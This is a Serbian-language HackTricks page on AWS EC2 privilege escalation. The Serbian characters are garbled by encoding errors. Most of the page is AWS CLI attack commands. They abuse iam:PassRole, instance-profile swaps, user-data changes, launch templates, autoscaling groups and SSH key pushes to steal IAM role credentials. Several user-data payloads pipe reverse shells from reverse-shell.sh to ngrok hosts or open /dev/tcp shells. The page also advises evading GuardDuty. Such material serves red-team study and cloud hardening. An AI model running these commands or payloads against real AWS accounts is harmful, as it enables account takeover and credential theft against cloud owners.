# AWS - EC2 Privilegije

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## EC2

Za vi코e **informacija o EC2** proverite:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

Napada캜 bi mogao **kreirati instancu koja pridru쬿je IAM ulogu, a zatim pristupiti instanci** da bi ukrao IAM kredencijale uloge sa metadata endpointa.

* **Pristup putem SSH-a**

Pokrenite novu instancu koriste캖i **kreirani** **ssh klju캜** (`--key-name`) a zatim se pove쬴te putem ssh-a (ako 쬰lite da kreirate novi, mo쬯a 캖e vam biti potrebna dozvola `ec2:CreateKeyPair`).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **Pristup putem reverznog 코koljka u korisni캜kim podacima**

Mo쬰te pokrenuti novu instancu koriste캖i **korisni캜ke podatke** (`--user-data`) koji 캖e vam poslati **reverzni 코koljka**. Na ovaj na캜in nije potrebno specificirati sigurnosnu grupu.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
Budite oprezni sa GuradDuty ako koristite akreditive IAM uloge van instance-a:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktno pove캖anje privilegija do bilo koje EC2 uloge povezane sa postoje캖im profilima instance.

#### Pove캖anje privilegija do ECS

Sa ovim setom dozvola mo쬰te tako캠e **kreirati EC2 instancu i registrovati je unutar ECS klastera**. Na taj na캜in, ECS **servisi** 캖e se **izvr코avati** unutar **EC2 instance** gde imate pristup, a zatim mo쬰te provaliti u te servise (docker kontejnere) i **ukrasti njihove povezane ECS uloge**.

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

Da biste saznali kako **prisiliti ECS usluge da se pokrenu** na ovom novom EC2 instanci, pogledajte:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

Ako **ne mo쬰te kreirati novu instancu**, ali imate dozvolu `ecs:RegisterContainerInstance`, mo쬯a 캖ete mo캖i registrovati instancu unutar klastera i izvr코iti komentiran napad.

**Potencijalni uticaj:** Direktno pove캖anje privilegija na ECS ulogama povezanim sa zadacima.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Sli캜no kao i u prethodnom scenariju, napada캜 sa ovim dozvolama mo쬰 **promeniti IAM ulogu kompromitovane instance** kako bi ukrao nove akreditive.\
Po코to profil instance mo쬰 imati samo jednu ulogu, ako profil instance **ve캖 ima ulogu** (uobi캜ajeni slu캜aj), tako캠e 캖e vam biti potrebno **`iam:RemoveRoleFromInstanceProfile`**.

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

Ako **profil instance ima ulogu** i napada캜 je **ne mo쬰 ukloniti**, postoji jo코 jedan na캜in. On mo쬰 **prona캖i** profil instance **bez uloge** ili **kreirati novi** (`iam:CreateInstanceProfile`), **dodati** ulogu tom profilu instance (kao 코to je ranije opisano) i **povezati profil instance** koji je kompromitovan sa kompromitovanom **instancijom**:

* Ako instanca **nema nijedan profil** instance (`ec2:AssociateIamInstanceProfile`) \*
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**Potencijalni uticaj:** Direktno pove캖anje privilegija na drugu EC2 ulogu (potrebno je da ste kompromitovali AWS EC2 instancu i imate dodatne dozvole ili specifi캜an status instance profila).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

Sa ovim dozvolama je mogu캖e promeniti profil instance koji je povezan sa instancom, tako da ako je napad ve캖 imao pristup instanci, mo캖i 캖e da ukrade akreditive za vi코e uloga profila instance menjaju캖i onu koja je povezana sa njom.

* Ako **ima profil instance**, mo쬰te ga **ukloniti** (`ec2:DisassociateIamInstanceProfile`) i **povezati** ga \*
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* ili **zamenite** **profil instance** kompromitovane instance (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<vrednost> --association-id <vrednost>
```
````
{% endcode %}

**Potencijalni uticaj:** Direktno pove캖anje privilegija na drugu EC2 ulogu (morate da kompromitujete AWS EC2 instancu i imate dodatne dozvole ili odre캠eni status instance profila).

### `ec2:RequestSpotInstances`,`iam:PassRole`

Napada캜 sa dozvolama **`ec2:RequestSpotInstances` i `iam:PassRole`** mo쬰 **zahtevati** instancu **Spot** sa **povezanom EC2 ulogom** i **rev shell-om** u **korisni캜kim podacima**.\
Kada se instanca pokrene, mo쬰 **ukrasti IAM ulogu**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

Napada캜 sa **`ec2:ModifyInstanceAttribute`** mo쬰 da menja atribute instanci. Me캠u njima, mo쬰 **promeniti korisni캜ke podatke**, 코to implicira da mo쬰 da pokrene **proizvoljne podatke na instanci**. To se mo쬰 iskoristiti za dobijanje **rev 코ela na EC2 instanci**.

Napomena da se atributi mogu **menjati samo dok je instanca zaustavljena**, pa su potrebne dozvole **`ec2:StopInstances`** i **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija na bilo koju EC2 IAM ulogu koja je pridru쬰na kreiranoj instanci.

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

Napada캜 sa dozvolama **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`i `ec2:ModifyLaunchTemplate`** mo쬰 kreirati **novu verziju Launch Template-a** sa **rev shell-om u** podacima korisnika i **bilo kojom EC2 IAM ulogom na njoj**, promeniti podrazumevanu verziju, i **bilo koja grupa automatskog skaliranja** koja **koristi** taj **Launch Template** koji je **konfigurisan** da koristi **najnoviju** ili **podrazumevanu verziju** 캖e **ponovo pokrenuti instance** koriste캖i taj template i izvr코iti rev shell.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**Potencijalni uticaj:** Direktno pove캖anje privilegija na drugu EC2 ulogu.

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

Napada캜 sa dozvolama **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** mo쬰 **kreirati konfiguraciju pokretanja** sa **IAM ulogom** i **rev shell**-om unutar **korisni캜kih podataka**, zatim **kreirati grupu automatskog skaliranja** iz te konfiguracije i sa캜ekati da rev shell **ukrade IAM ulogu**.
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija na drugu EC2 ulogu.

### `!autoscaling`

Skup dozvola **`ec2:CreateLaunchTemplate`** i **`autoscaling:CreateAutoScalingGroup`** **nije dovoljan za pove캖anje** privilegija na IAM ulogu jer da biste pridru쬴li ulogu navedenu u konfiguraciji pokretanja ili u predlo코ku pokretanja **potrebne su vam dozvole `iam:PassRole` i `ec2:RunInstances`** (코to je poznato pove캖anje privilegija).

### `ec2-instance-connect:SendSSHPublicKey`

Napada캜 sa dozvolom **`ec2-instance-connect:SendSSHPublicKey`** mo쬰 dodati SSH klju캜 korisniku i koristiti ga za pristup (ako ima SSH pristup instanci) ili za pove캖anje privilegija.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**Potencijalni uticaj:** Direktno pove캖anje privilegija na EC2 IAM ulogama koje su pridru쬰ne pokrenutim instancama.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

Napada캜 sa dozvolom **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** mo쬰 **dodati SSH klju캜 na serijsku vezu**. Ako serijska veza nije omogu캖ena, napada캜u je potrebna dozvola **`ec2:EnableSerialConsoleAccess` da je omogu캖i**.

Da biste se povezali na serijski port, tako캠e **morate znati korisni캜ko ime i lozinku korisnika** unutar ma코ine.

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

Ovaj na캜in nije toliko koristan za privesc jer je potrebno znati korisni캜ko ime i lozinku da bi se iskoristio.

**Potencijalni uticaj:** (Visoko nepotvr캠eno) Direktan privesc na EC2 IAM uloge povezane sa pokrenutim instancama.

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
